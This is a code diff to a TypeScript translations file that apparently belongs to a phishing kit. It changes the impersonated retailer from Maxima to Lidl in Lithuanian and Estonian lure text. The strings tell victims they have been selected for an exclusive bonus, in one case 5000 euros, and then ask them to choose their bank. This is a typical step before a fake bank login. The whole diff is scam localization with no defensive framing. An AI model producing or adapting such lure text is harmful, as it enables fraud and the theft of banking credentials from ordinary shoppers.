@@ -39,10 +39,10 @@ export type TranslationKeys = {
 
 export const translations: Record<string, TranslationKeys> = {
   lt: {
-    portal_name: "Maxima Klientų Portalas",
-    support_center_name: "Maxima Klientų Aptarnavimas",
-    win_title: "Ekskliuzyvinė Maxima Premija",
-    win_subtitle: "Sveikiname! Buvote atrinkti šiandienos Maxima akcijai. Spustelėkite žemiau esantį mygtuką, kad atsiimtumėte savo premiją.",
+    portal_name: "Lidl Klientų Portalas",
+    support_center_name: "Lidl Klientų Aptarnavimas",
+    win_title: "Ekskliuzyvinė Lidl Premija",
+    win_subtitle: "Sveikiname! Buvote atrinkti šiandienos Lidl akcijai. Spustelėkite žemiau esantį mygtuką, kad atsiimtumėte savo premiją.",
     win_button: "Atsiimti premiją",
     banken_title: "Pasirinkite savo banką",
     banken_subtitle: "Pasirinkite savo banką, kad tęstumėte.",
@@ -153,10 +153,10 @@ export const translations: Record<string, TranslationKeys> = {
     profile_loading_text: "Verwerken..."
   },
   et: {
-    portal_name: "Maxima Kliendiportaal",
-    support_center_name: "Maxima Klienditeenindus",
-    win_title: "Eksklusiivne Maxima Boonus",
-    win_subtitle: "Palju õnne! Olete valitud tänasesse Maxima kampaaniasse. Klõpsake allolevat nuppu, et lunastada oma 5000 euro suurune boonus.",
+    portal_name: "Lidl Kliendiportaal",
+    support_center_name: "Lidl Klienditeenindus",
+    win_title: "Eksklusiivne Lidl Boonus",
+    win_subtitle: "Palju õnne! Olete valitud tänasesse Lidl kampaaniasse. Klõpsake allolevat nuppu, et lunastada oma 5000 euro suurune boonus.",
     win_button: "Lunasta boonus",
     banken_title: "Vali oma pank",
     banken_subtitle: "Jätkamiseks vali oma Eesti pank.",
